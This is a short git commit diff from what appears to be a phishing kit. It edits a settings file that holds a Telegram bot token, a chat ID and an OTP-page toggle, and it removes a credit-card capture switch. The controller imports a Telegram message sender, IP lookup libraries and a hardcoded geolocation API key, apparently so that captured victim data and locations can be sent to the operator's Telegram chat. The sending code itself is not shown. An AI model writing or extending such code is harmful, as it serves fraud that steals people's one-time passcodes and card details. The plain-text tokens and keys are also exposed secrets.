f8a472be619785c6bf71c360acd7fb97e7027e4d
Mystic0x0 <154999144+Mystic0x0@users.noreply.github.com>
2024-02-02 20:03:28 -0500

    Add files via upload

--- app/config/settings.js
+++ app/config/settings.js
@@ -2,5 +2,4 @@ module.exports = {
 	botToken: "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4",
 	chatId: "5200289419",
 	otpPage: "on",
-	cCard: "on",
 };
--- app/controllers/controller.js
+++ app/controllers/controller.js
@@ -1,7 +1,7 @@
 const { sendMessageFor } = require("simple-telegram-message");
 const ipInfo = require("ip-info-finder");
 const { getClientIp } = require("request-ip");
-const { botToken, chatId, otpPage, cCard } = require("../config/settings");
+const { botToken, chatId, otpPage } = require("../config/settings");
 const axios = require('axios');
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
